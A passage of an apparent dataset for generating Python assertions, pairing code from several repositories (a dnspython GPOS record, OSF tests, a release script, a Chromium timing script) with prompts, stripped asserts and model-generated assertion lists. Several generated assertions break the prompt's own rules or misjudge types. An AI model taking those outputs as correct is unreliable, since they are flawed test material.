 [45, 'len(result2.results)', '==', 2, 'Limit for get_result was set to 2'],
 [48, 'result3', '!=', 'None', 'Paginator should return a result set'],
 [48, 'len(result3.results)', '==', 2, 'Limit for get_result was set to 2']]"
maliciamrg/xbmc-addon-tvtumbler,"# Copyright (C) 2003-2007, 2009-2011 Nominum, Inc.
#
# Permission to use, copy, modify, and distribute this software and its
# documentation for any purpose with or without fee is hereby granted,
# provided that the above copyright notice and this permission notice
# appear in all copies.
#
# THE SOFTWARE IS PROVIDED ""AS IS"" AND NOMINUM DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL NOMINUM BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT
# OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import dns.exception
import dns.rdata
import dns.tokenizer

def _validate_float_string(what):
    if what[0] == '-' or what[0] == '+':
        what = what[1:]
    if what.isdigit():
        return
    (left, right) = what.split('.')
    if left == '' and right == '':
        raise dns.exception.FormError
    if not left == '' and not left.isdigit():
        raise dns.exception.FormError
    if not right == '' and not right.isdigit():
        raise dns.exception.FormError

class GPOS(dns.rdata.Rdata):
    """"""GPOS record

    @ivar latitude: latitude
    @type latitude: string
    @ivar longitude: longitude
    @type longitude: string
    @ivar altitude: altitude
    @type altitude: string
    @see: RFC 1712""""""

    __slots__ = ['latitude', 'longitude', 'altitude']

    def __init__(self, rdclass, rdtype, latitude, longitude, altitude):
        super(GPOS, self).__init__(rdclass, rdtype)
        if isinstance(latitude, float) or \
           isinstance(latitude, int) or \
           isinstance(latitude, long):
            latitude = str(latitude)
        if isinstance(longitude, float) or \
           isinstance(longitude, int) or \
           isinstance(longitude, long):
            longitude = str(longitude)
        if isinstance(altitude, float) or \
           isinstance(altitude, int) or \
           isinstance(altitude, long):
            altitude = str(altitude)
        _validate_float_string(latitude)
        _validate_float_string(longitude)
        _validate_float_string(altitude)
        self.latitude = latitude
        self.longitude = longitude
        self.altitude = altitude

    def to_text(self, origin=None, relativize=True, **kw):
        return '%s %s %s' % (self.latitude, self.longitude, self.altitude)

    def from_text(cls, rdclass, rdtype, tok, origin = None, relativize = True):
        latitude = tok.get_string()
        longitude = tok.get_string()
        altitude = tok.get_string()
        tok.get_eol()
        return cls(rdclass, rdtype, latitude, longitude, altitude)

    from_text = classmethod(from_text)

    def to_wire(self, file, compress = None, origin = None):
        l = len(self.latitude)
        assert l < 256
        byte = chr(l)
        file.write(byte)
        file.write(self.latitude)
        l = len(self.longitude)
        assert l < 256
        byte = chr(l)
        file.write(byte)
        file.write(self.longitude)
        l = len(self.altitude)
        assert l < 256
        byte = chr(l)
        file.write(byte)
        file.write(self.altitude)

    def from_wire(cls, rdclass, rdtype, wire, current, rdlen, origin = None):
        l = ord(wire[current])
        current += 1
        rdlen -= 1
        if l > rdlen:
            raise dns.exception.FormError
        latitude = wire[current : current + l].unwrap()
        current += l
        rdlen -= l
        l = ord(wire[current])
        current += 1
        rdlen -= 1
        if l > rdlen:
            raise dns.exception.FormError
        longitude = wire[current : current + l].unwrap()
        current += l
        rdlen -= l
        l = ord(wire[current])
        current += 1
        rdlen -= 1
        if l != rdlen:
            raise dns.exception.FormError
        altitude = wire[current : current + l].unwrap()
        return cls(rdclass, rdtype, latitude, longitude, altitude)

    from_wire = classmethod(from_wire)

    def _cmp(self, other):
        v = cmp(self.latitude, other.latitude)
        if v == 0:
            v = cmp(self.longitude, other.longitude)
            if v == 0:
                v = cmp(self.altitude, other.altitude)
        return v

    def _get_float_latitude(self):
        return float(self.latitude)

    def _set_float_latitude(self, value):
        self.latitude = str(value)

    float_latitude = property(_get_float_latitude, _set_float_latitude,
                              doc=""latitude as a floating point value"")

    def _get_float_longitude(self):
        return float(self.longitude)

    def _set_float_longitude(self, value):
        self.longitude = str(value)

    float_longitude = property(_get_float_longitude, _set_float_longitude,
                               doc=""longitude as a floating point value"")

    def _get_float_altitude(self):
        return float(self.altitude)

    def _set_float_altitude(self, value):
        self.altitude = str(value)

    float_altitude = property(_get_float_altitude, _set_float_altitude,
                              doc=""altitude as a floating point value"")
","
1# Copyright (C) 2003-2007, 2009-2011 Nominum, Inc.
2#
3# Permission to use, copy, modify, and distribute this software and its
4# documentation for any purpose with or without fee is hereby granted,
5# provided that the above copyright notice and this permission notice
6# appear in all copies.
7#
8# THE SOFTWARE IS PROVIDED ""AS IS"" AND NOMINUM DISCLAIMS ALL WARRANTIES
9# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
10# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL NOMINUM BE LIABLE FOR
11# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
12# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
13# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT
14# OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
15
16import dns.exception
17import dns.rdata
18import dns.tokenizer
19
20def _validate_float_string(what):
21    if what[0] == '-' or what[0] == '+':
22        what = what[1:]
23    if what.isdigit():
24        return
25    (left, right) = what.split('.')
26    if left == '' and right == '':
27        raise dns.exception.FormError
28    if not left == '' and not left.isdigit():
29        raise dns.exception.FormError
30    if not right == '' and not right.isdigit():
31        raise dns.exception.FormError
32
33class GPOS(dns.rdata.Rdata):
34    """"""GPOS record
35
36    @ivar latitude: latitude
37    @type latitude: string
38    @ivar longitude: longitude
39    @type longitude: string
40    @ivar altitude: altitude
41    @type altitude: string
42    @see: RFC 1712""""""
43
44    __slots__ = ['latitude', 'longitude', 'altitude']
45
46    def __init__(self, rdclass, rdtype, latitude, longitude, altitude):
47        super(GPOS, self).__init__(rdclass, rdtype)
48        if isinstance(latitude, float) or \
49           isinstance(latitude, int) or \
50           isinstance(latitude, long):
51            latitude = str(latitude)
52        if isinstance(longitude, float) or \
53           isinstance(longitude, int) or \
54           isinstance(longitude, long):
55            longitude = str(longitude)
56        if isinstance(altitude, float) or \
57           isinstance(altitude, int) or \
58           isinstance(altitude, long):
59            altitude = str(altitude)
60        _validate_float_string(latitude)
61        _validate_float_string(longitude)
62        _validate_float_string(altitude)
63        self.latitude = latitude
64        self.longitude = longitude
65        self.altitude = altitude
66
67    def to_text(self, origin=None, relativize=True, **kw):
68        return '%s %s %s' % (self.latitude, self.longitude, self.altitude)
69
70    def from_text(cls, rdclass, rdtype, tok, origin = None, relativize = True):
71        latitude = tok.get_string()
72        longitude = tok.get_string()
73        altitude = tok.get_string()
74        tok.get_eol()
75        return cls(rdclass, rdtype, latitude, longitude, altitude)
76
77    from_text = classmethod(from_text)
78
79    def to_wire(self, file, compress = None, origin = None):
80        l = len(self.latitude)
81        byte = chr(l)
82        file.write(byte)
83        file.write(self.latitude)
84        l = len(self.longitude)
85        byte = chr(l)
86        file.write(byte)
87        file.write(self.longitude)
88        l = len(self.altitude)
89        byte = chr(l)
90        file.write(byte)
91        file.write(self.altitude)
92
93    def from_wire(cls, rdclass, rdtype, wire, current, rdlen, origin = None):
94        l = ord(wire[current])
95        current += 1
96        rdlen -= 1
97        if l > rdlen:
98            raise dns.exception.FormError
99        latitude = wire[current : current + l].unwrap()
100        current += l
101        rdlen -= l
102        l = ord(wire[current])
103        current += 1
104        rdlen -= 1
105        if l > rdlen:
106            raise dns.exception.FormError
107        longitude = wire[current : current + l].unwrap()
108        current += l
109        rdlen -= l
110        l = ord(wire[current])
111        current += 1
112        rdlen -= 1
113        if l != rdlen:
114            raise dns.exception.FormError
115        altitude = wire[current : current + l].unwrap()
116        return cls(rdclass, rdtype, latitude, longitude, altitude)
117
118    from_wire = classmethod(from_wire)
119
120    def _cmp(self, other):
121        v = cmp(self.latitude, other.latitude)
122        if v == 0:
123            v = cmp(self.longitude, other.longitude)
124            if v == 0:
125                v = cmp(self.altitude, other.altitude)
126        return v
127
128    def _get_float_latitude(self):
129        return float(self.latitude)
130
131    def _set_float_latitude(self, value):
132        self.latitude = str(value)
133
134    float_latitude = property(_get_float_latitude, _set_float_latitude,
135                              doc=""latitude as a floating point value"")
136
137    def _get_float_longitude(self):
138        return float(self.longitude)
139
140    def _set_float_longitude(self, value):
141        self.longitude = str(value)
142
143    float_longitude = property(_get_float_longitude, _set_float_longitude,
144                               doc=""longitude as a floating point value"")
145
146    def _get_float_altitude(self):
147        return float(self.altitude)
148
149    def _set_float_altitude(self, value):
150        self.altitude = str(value)
151
152    float_altitude = property(_get_float_altitude, _set_float_altitude,
153                              doc=""altitude as a floating point value"")
154","[['l', '<', '256'], ['l', '<', '256'], ['l', '<', '256']]",3,3,1.0,0.0005658242172764,"['what', '(left', 'right)', '__slots__', 'rdclass', 'rdtype', 'latitude', 'longitude', 'altitude', 'self.latitude', 'self.longitude', 'self.altitude', 'origin', 'relativize', '**kw', 'cls', 'tok', 'from_text', 'file', 'compress', 'l', 'byte', 'wire', 'current', 'rdlen', 'from_wire', 'other', 'v', 'value', 'float_latitude', 'float_longitude', 'float_altitude']",32,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['what', '(left', 'right)', '__slots__', 'rdclass', 'rdtype', 'latitude', 'longitude', 'altitude', 'self.latitude', 'self.longitude', 'self.altitude', 'origin', 'relativize', '**kw', 'cls', 'tok', 'from_text', 'file', 'compress', 'l', 'byte', 'wire', 'current', 'rdlen', 'from_wire', 'other', 'v', 'value', 'float_latitude', 'float_longitude', 'float_altitude']
*Code:

1# Copyright (C) 2003-2007, 2009-2011 Nominum, Inc.
2#
3# Permission to use, copy, modify, and distribute this software and its
4# documentation for any purpose with or without fee is hereby granted,
5# provided that the above copyright notice and this permission notice
6# appear in all copies.
7#
8# THE SOFTWARE IS PROVIDED ""AS IS"" AND NOMINUM DISCLAIMS ALL WARRANTIES
9# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
10# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL NOMINUM BE LIABLE FOR
11# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
12# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
13# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT
14# OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
15
16import dns.exception
17import dns.rdata
18import dns.tokenizer
19
20def _validate_float_string(what):
21    if what[0] == '-' or what[0] == '+':
22        what = what[1:]
23    if what.isdigit():
24        return
25    (left, right) = what.split('.')
26    if left == '' and right == '':
27        raise dns.exception.FormError
28    if not left == '' and not left.isdigit():
29        raise dns.exception.FormError
30    if not right == '' and not right.isdigit():
31        raise dns.exception.FormError
32
33class GPOS(dns.rdata.Rdata):
34    """"""GPOS record
35
36    @ivar latitude: latitude
37    @type latitude: string
38    @ivar longitude: longitude
39    @type longitude: string
40    @ivar altitude: altitude
41    @type altitude: string
42    @see: RFC 1712""""""
43
44    __slots__ = ['latitude', 'longitude', 'altitude']
45
46    def __init__(self, rdclass, rdtype, latitude, longitude, altitude):
47        super(GPOS, self).__init__(rdclass, rdtype)
48        if isinstance(latitude, float) or \
49           isinstance(latitude, int) or \
50           isinstance(latitude, long):
51            latitude = str(latitude)
52        if isinstance(longitude, float) or \
53           isinstance(longitude, int) or \
54           isinstance(longitude, long):
55            longitude = str(longitude)
56        if isinstance(altitude, float) or \
57           isinstance(altitude, int) or \
58           isinstance(altitude, long):
59            altitude = str(altitude)
60        _validate_float_string(latitude)
61        _validate_float_string(longitude)
62        _validate_float_string(altitude)
63        self.latitude = latitude
64        self.longitude = longitude
65        self.altitude = altitude
66
67    def to_text(self, origin=None, relativize=True, **kw):
68        return '%s %s %s' % (self.latitude, self.longitude, self.altitude)
69
70    def from_text(cls, rdclass, rdtype, tok, origin = None, relativize = True):
71        latitude = tok.get_string()
72        longitude = tok.get_string()
73        altitude = tok.get_string()
74        tok.get_eol()
75        return cls(rdclass, rdtype, latitude, longitude, altitude)
76
77    from_text = classmethod(from_text)
78
79    def to_wire(self, file, compress = None, origin = None):
80        l = len(self.latitude)
81        byte = chr(l)
82        file.write(byte)
83        file.write(self.latitude)
84        l = len(self.longitude)
85        byte = chr(l)
86        file.write(byte)
87        file.write(self.longitude)
88        l = len(self.altitude)
89        byte = chr(l)
90        file.write(byte)
91        file.write(self.altitude)
92
93    def from_wire(cls, rdclass, rdtype, wire, current, rdlen, origin = None):
94        l = ord(wire[current])
95        current += 1
96        rdlen -= 1
97        if l > rdlen:
98            raise dns.exception.FormError
99        latitude = wire[current : current + l].unwrap()
100        current += l
101        rdlen -= l
102        l = ord(wire[current])
103        current += 1
104        rdlen -= 1
105        if l > rdlen:
106            raise dns.exception.FormError
107        longitude = wire[current : current + l].unwrap()
108        current += l
109        rdlen -= l
110        l = ord(wire[current])
111        current += 1
112        rdlen -= 1
113        if l != rdlen:
114            raise dns.exception.FormError
115        altitude = wire[current : current + l].unwrap()
116        return cls(rdclass, rdtype, latitude, longitude, altitude)
117
118    from_wire = classmethod(from_wire)
119
120    def _cmp(self, other):
121        v = cmp(self.latitude, other.latitude)
122        if v == 0:
123            v = cmp(self.longitude, other.longitude)
124            if v == 0:
125                v = cmp(self.altitude, other.altitude)
126        return v
127
128    def _get_float_latitude(self):
129        return float(self.latitude)
130
131    def _set_float_latitude(self, value):
132        self.latitude = str(value)
133
134    float_latitude = property(_get_float_latitude, _set_float_latitude,
135                              doc=""latitude as a floating point value"")
136
137    def _get_float_longitude(self):
138        return float(self.longitude)
139
140    def _set_float_longitude(self, value):
141        self.longitude = str(value)
142
143    float_longitude = property(_get_float_longitude, _set_float_longitude,
144                               doc=""longitude as a floating point value"")
145
146    def _get_float_altitude(self):
147        return float(self.altitude)
148
149    def _set_float_altitude(self, value):
150        self.altitude = str(value)
151
152    float_altitude = property(_get_float_altitude, _set_float_altitude,
153                              doc=""altitude as a floating point value"")
154",7329,"[[20, 'what', '!=', '', 'Validate that what is not empty before checking first character'],
 [22, 'what', '!=', '', 'what is altered and should be asserted that it is not empty'],
 [45, 'rdclass', '!=', '', 'rdclass cannot be empty for initialization'],
 [45, 'rdtype', '!=', '', 'rdtype cannot be empty for initialization'],
 [45, 'latitude', '!=', '', 'latitude cannot be empty for initialization'],
 [45, 'longitude', '!=', '', 'longitude cannot be empty for initialization'],
 [45, 'altitude', '!=', '', 'altitude cannot be empty for initialization'],
 [70, 'rdclass', '!=', '', 'rdclass cannot be empty for text conversion'],
 [70, 'rdtype', '!=', '', 'rdtype cannot be empty for text conversion'],
 [70, 'tok', '!=', '', 'tok cannot be empty for text conversion'],
 [93, 'rdclass', '!=', '', 'rdclass cannot be empty for wire conversion'],
 [93, 'rdtype', '!=', '', 'rdtype cannot be empty for wire conversion'],
 [93, 'wire', '!=', '', 'wire cannot be empty for wire conversion'],
 [93, 'current', '>=', 0, 'current index must be positive for proper traversal'],
 [93, 'rdlen', '>=', 0, 'rdlen must be positive for proper traversal'],
 [133, 'value', '>=', -90, 'latitude value should be in the range of proper latitude (-90 to 90)'],
 [133, 'value', '<=', 90, 'latitude value should be in the range of proper latitude (-90 to 90)'],
 [141, 'value', '>=', -180, 'longitude value should be in range of proper longitude (-180 to 180)'],
 [141, 'value', '<=', 180, 'longitude value should be in range of proper longitude (-180 to 180)']]"
saradbowman/osf.io,"import pytest
from addons.base.utils import get_mfr_url

from addons.osfstorage.tests.utils import StorageTestCase
from tests.base import OsfTestCase
from osf_tests.factories import ProjectFactory, UserFactory, RegionFactory, CommentFactory
from website.settings import MFR_SERVER_URL


class MockFolder(dict, object):

    def __init__(self):
        self.name = 'Fake Folder'
        self.json = {'id': 'Fake Key', 'parent_id': 'cba321', 'name': 'Fake Folder'}
        self['data'] = {'name': 'Fake Folder', 'key': 'Fake Key', 'parentCollection': False}
        self['library'] = {'type': 'personal', 'id': '34241'}
        self['name'] = 'Fake Folder'
        self['id'] = 'Fake Key'


class MockLibrary(dict, object):

    def __init__(self):
        self.name = 'Fake Library'
        self.json = {'id': 'Fake Library Key', 'parent_id': 'cba321'}
        self['data'] = {'name': 'Fake Library', 'key': 'Fake Key', 'id': '12345' }
        self['name'] = 'Fake Library'
        self['id'] = 'Fake Library Key'


@pytest.mark.django_db
class TestAddonsUtils(OsfTestCase):
    def test_mfr_url(self):
        user = UserFactory()
        project = ProjectFactory(creator=user)
        comment = CommentFactory()
        assert get_mfr_url(project, 'github') == MFR_SERVER_URL
        assert get_mfr_url(project, 'osfstorage') == project.osfstorage_region.mfr_url
        assert get_mfr_url(comment, 'osfstorage') == MFR_SERVER_URL
","
1import pytest
2from addons.base.utils import get_mfr_url
3
4from addons.osfstorage.tests.utils import StorageTestCase
5from tests.base import OsfTestCase
6from osf_tests.factories import ProjectFactory, UserFactory, RegionFactory, CommentFactory
7from website.settings import MFR_SERVER_URL
8
9
10class MockFolder(dict, object):
11
12    def __init__(self):
13        self.name = 'Fake Folder'
14        self.json = {'id': 'Fake Key', 'parent_id': 'cba321', 'name': 'Fake Folder'}
15        self['data'] = {'name': 'Fake Folder', 'key': 'Fake Key', 'parentCollection': False}
16        self['library'] = {'type': 'personal', 'id': '34241'}
17        self['name'] = 'Fake Folder'
18        self['id'] = 'Fake Key'
19
20
21class MockLibrary(dict, object):
22
23    def __init__(self):
24        self.name = 'Fake Library'
25        self.json = {'id': 'Fake Library Key', 'parent_id': 'cba321'}
26        self['data'] = {'name': 'Fake Library', 'key': 'Fake Key', 'id': '12345' }
27        self['name'] = 'Fake Library'
28        self['id'] = 'Fake Library Key'
29
30
31@pytest.mark.django_db
32class TestAddonsUtils(OsfTestCase):
33    def test_mfr_url(self):
34        user = UserFactory()
35        project = ProjectFactory(creator=user)
36        comment = CommentFactory()
37","[['get_mfr_url(project', '==', 'True'], ['get_mfr_url(project', '==', 'True'], ['get_mfr_url(comment', '==', 'True']]",3,3,1.0,0.0020949720670391,"['self.name', 'self.json', ""self['data']"", ""self['library']"", ""self['name']"", ""self['id']"", 'user', 'project', 'comment']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.name', 'self.json', ""self['data']"", ""self['library']"", ""self['name']"", ""self['id']"", 'user', 'project', 'comment']
*Code:

1import pytest
2from addons.base.utils import get_mfr_url
3
4from addons.osfstorage.tests.utils import StorageTestCase
5from tests.base import OsfTestCase
6from osf_tests.factories import ProjectFactory, UserFactory, RegionFactory, CommentFactory
7from website.settings import MFR_SERVER_URL
8
9
10class MockFolder(dict, object):
11
12    def __init__(self):
13        self.name = 'Fake Folder'
14        self.json = {'id': 'Fake Key', 'parent_id': 'cba321', 'name': 'Fake Folder'}
15        self['data'] = {'name': 'Fake Folder', 'key': 'Fake Key', 'parentCollection': False}
16        self['library'] = {'type': 'personal', 'id': '34241'}
17        self['name'] = 'Fake Folder'
18        self['id'] = 'Fake Key'
19
20
21class MockLibrary(dict, object):
22
23    def __init__(self):
24        self.name = 'Fake Library'
25        self.json = {'id': 'Fake Library Key', 'parent_id': 'cba321'}
26        self['data'] = {'name': 'Fake Library', 'key': 'Fake Key', 'id': '12345' }
27        self['name'] = 'Fake Library'
28        self['id'] = 'Fake Library Key'
29
30
31@pytest.mark.django_db
32class TestAddonsUtils(OsfTestCase):
33    def test_mfr_url(self):
34        user = UserFactory()
35        project = ProjectFactory(creator=user)
36        comment = CommentFactory()
37",2780,"[[13, 'self.name', '!=', None, 'name attribute must be initialized in MockFolder class'],
 [14, 'self.json', '!=', None, 'json attribute must be initialized in MockFolder class'],
 [15, ""self['data']"", '!=', None, 'data attribute must be initialized in MockFolder class'],
 [16, ""self['library']"", '!=', None, 'library attribute must be initialized in MockFolder class'],
 [17, ""self['name']"", '==', 'self.name', 'name attribute consistency in MockFolder class'],
 [18, ""self['id']"", '==', ""self.json['id']"", 'id attribute consistency in MockFolder class'],
 [24, 'self.name', '!=', None, 'name attribute must be initialized in MockLibrary class'],
 [25, 'self.json', '!=', None, 'json attribute must be initialized in MockLibrary class'],
 [26, ""self['data']"", '!=', None, 'data attribute must be initialized in MockLibrary class'],
 [27, ""self['name']"", '==', 'self.name', 'name attribute consistency in MockLibrary class'],
 [28, ""self['id']"", '==', ""self.json['id']"", 'id attribute consistency in MockLibrary class'],
 [34, 'user', '!=', None, 'Ensure UserFactory initalization'],
 [35, 'project', '!=', None, 'Ensure ProjectFactory initialization'],
 [36, 'comment', '!=', None, 'Ensure CommentFactory initialization']]"
tazo90/pulsar,"import os
import sys
from datetime import datetime, date

import setup
import clean

clean.run()
script = os.path.abspath(setup.__file__)

assert setup.mod.VERSION[3] == 'final'

with open('CHANGELOG.rst', 'r') as f:
    changelog = f.read()

top = changelog.split('\n')[0]
version_date = top.split(' - ')
assert len(version_date) == 2, 'Top of CHANGELOG.rst must be version and date'
version, datestr = version_date
dt = datetime.strptime(datestr, '%Y-%b-%d').date()
assert dt == date.today()

assert version == 'Ver. %s' % setup.mod.__version__

argv = [script, 'sdist'] + sys.argv[1:]
setup.run(argv=argv)


print('%s %s ready!' % (setup.package_name, setup.mod.__version__))
","
1import os
2import sys
3from datetime import datetime, date
4
5import setup
6import clean
7
8clean.run()
9script = os.path.abspath(setup.__file__)
10
11
12with open('CHANGELOG.rst', 'r') as f:
13    changelog = f.read()
14
15top = changelog.split('\n')[0]
16version_date = top.split(' - ')
17version, datestr = version_date
18dt = datetime.strptime(datestr, '%Y-%b-%d').date()
19
20
21argv = [script, 'sdist'] + sys.argv[1:]
22setup.run(argv=argv)
23
24
25print('%s %s ready!' % (setup.package_name, setup.mod.__version__))
26","[['setup.mod.VERSION[3]', '==', ""'final'""], ['len(version_date)', '==', '2'], [""date'"", '==', 'True'], ['dt', '==', 'date.today()'], ['version', '==', ""'Ver. %s' % setup.mod.__version__""]]",4,5,1.25,0.0073637702503681,"['script', 'changelog', 'top', 'version_date', 'version', 'datestr', 'dt', 'argv']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['script', 'changelog', 'top', 'version_date', 'version', 'datestr', 'dt', 'argv']
*Code:

1import os
2import sys
3from datetime import datetime, date
4
5import setup
6import clean
7
8clean.run()
9script = os.path.abspath(setup.__file__)
10
11
12with open('CHANGELOG.rst', 'r') as f:
13    changelog = f.read()
14
15top = changelog.split('\n')[0]
16version_date = top.split(' - ')
17version, datestr = version_date
18dt = datetime.strptime(datestr, '%Y-%b-%d').date()
19
20
21argv = [script, 'sdist'] + sys.argv[1:]
22setup.run(argv=argv)
23
24
25print('%s %s ready!' % (setup.package_name, setup.mod.__version__))
26",1989,"[[9, 'script', '!=', None, 'script must be assigned a value from setup.__file__'],
[13, 'changelog', '!=', None, 'changelog must be defined with content from CHANGELOG.rst'],
[15, 'top', '!=', None, 'top must be assigned the first splitted value of changelog'],
[17, 'version_date', '!=', None, 'version_date must successfully split top values'],
[17, 'version', '!=', None, 'version must be assigned a value from version_date'],
[17, 'datestr', '!=', None, 'datestr must be assigned a value from version_date'],
[18, 'dt', '!=', None, 'datetime must be successfully converted from datestr'],
[21, 'argv', '!=', None, 'argv must be defined successfully']]"
leighpauls/k2cro4,"#!/usr/bin/env python
# Copyright (c) 2012 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
import os
import sys
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

import telemetry

def Main(args):
  options = telemetry.BrowserOptions()
  parser = options.CreateParser('telemetry_perf_test.py')
  options, args = parser.parse_args(args)

  browser_to_create = telemetry.FindBrowser(options)
  assert browser_to_create
  with browser_to_create.Create() as b:
    with b.ConnectToNthTab(0) as tab:

      # Measure round-trip-time for evaluate
      times = []
      for i in range(1000):
        start = time.time()
        tab.runtime.Evaluate('%i * 2' % i)
        times.append(time.time() - start)
      N = float(len(times))
      avg = sum(times, 0.0) / N
      squared_diffs = [(t - avg) * (t - avg) for t in times]
      stdev = sum(squared_diffs, 0.0) / (N - 1)
      times.sort()
      percentile_75 = times[int(0.75 * N)]

      print ""%s: avg=%f; stdev=%f; min=%f; 75th percentile = %f"" % (
        ""Round trip time (seconds)"",
        avg, stdev, min(times), percentile_75)

  return 0

if __name__ == '__main__':
  sys.exit(Main(sys.argv[1:]))
","
1#!/usr/bin/env python
2# Copyright (c) 2012 The Chromium Authors. All rights reserved.
3# Use of this source code is governed by a BSD-style license that can be
4# found in the LICENSE file.
5import os
6import sys
7import time
8
9sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
10
11import telemetry
12
13def Main(args):
14  options = telemetry.BrowserOptions()
15  parser = options.CreateParser('telemetry_perf_test.py')
16  options, args = parser.parse_args(args)
17
18  browser_to_create = telemetry.FindBrowser(options)
19  with browser_to_create.Create() as b:
20    with b.ConnectToNthTab(0) as tab:
21
22      # Measure round-trip-time for evaluate
23      times = []
24      for i in range(1000):
25        start = time.time()
26        tab.runtime.Evaluate('%i * 2' % i)
27        times.append(time.time() - start)
28      N = float(len(times))
29      avg = sum(times, 0.0) / N
30      squared_diffs = [(t - avg) * (t - avg) for t in times]
31      stdev = sum(squared_diffs, 0.0) / (N - 1)
32      times.sort()
33      percentile_75 = times[int(0.75 * N)]
34
35      print ""%s: avg=%f; stdev=%f; min=%f; 75th percentile = %f"" % (
36        ""Round trip time (seconds)"",
37        avg, stdev, min(times), percentile_75)
38
39  return 0
40
41if __name__ == '__main__':
42  sys.exit(Main(sys.argv[1:]))
43","[['browser_to_create', '==', 'True']]",1,1,1.0,0.0007824726134585,"['args', 'options', 'parser', 'browser_to_create', 'times', 'start', 'N', 'avg', 'squared_diffs', 'stdev', 'percentile_75', 'print ""%s: avg=%f; stdev=%f; min=%f; 75th percentile']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
